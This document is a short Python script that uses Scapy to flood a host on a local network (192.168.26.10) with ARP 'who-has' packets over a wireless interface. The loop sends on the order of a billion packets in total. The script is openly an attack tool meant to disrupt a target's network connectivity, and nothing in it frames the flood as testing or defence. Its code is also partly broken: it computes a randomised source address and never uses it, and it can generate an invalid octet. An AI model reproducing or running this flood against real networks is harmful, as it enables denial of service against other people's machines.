from scapy.all import ARP, Ether, sendp
from scapy.layers.l2 import getmacbyip
import random as rd

def SoLongArp(target_ip, target_mac, num_packets=100):
    for _ in range(num_packets):
        source_ip = f"192.168.26.{rd.randint(0,256)}"
        arp_packets = Ether() / ARP(op="who-has", pdst=target_ip, hwdst=target_mac)
        sendp(arp_packets, iface="wlan0", count=num_packets)
        
target_ip = "192.168.26.10"
target_mac = getmacbyip(target_ip)

SoLongArp(target_ip, target_mac, num_packets=1000000)
